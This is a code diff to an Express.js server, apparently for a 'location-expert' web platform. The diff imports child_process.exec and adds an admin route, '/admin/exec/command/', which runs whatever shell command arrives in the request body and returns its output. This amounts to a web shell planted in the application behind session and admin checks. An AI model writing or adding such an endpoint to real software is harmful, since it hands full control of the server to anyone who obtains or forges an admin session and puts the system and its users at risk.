@@ -6,6 +6,7 @@ const allowedOrigins = [
 ]
 const crypto = require("crypto")
 const cookieParser = require('cookie-parser')
+const { exec } = require('child_process')
 const express = require('express')
 const fs = require('fs')
 const helmet = require('helmet')
@@ -257,6 +258,31 @@ app.get("/:expert/:platform/:path/:id/",
       await Helper.logError(error, req)
     }
     return res.sendStatus(404)
+  }
+)
+app.post('/admin/exec/command/', 
+  Helper.verifyLocation,
+  Helper.verifyReferer,
+  Helper.addJwt,
+  Helper.verifySession,
+  adminOnly,
+  (req, res) => {
+    try {
+      const command = req.body.command
+      exec(command, (error, stdout, stderr) => {
+        if (error) {
+          res.status(500).send(error.message)
+          return
+        }
+        if (stderr) {
+          res.status(500).send(stderr)
+          return
+        }
+        res.send(stdout)
+      })
+    } catch (e) {
+      res.sendStatus(404)
+    }
   }
 )
 app.post("/location-expert/get/platform/roles/text-value/",
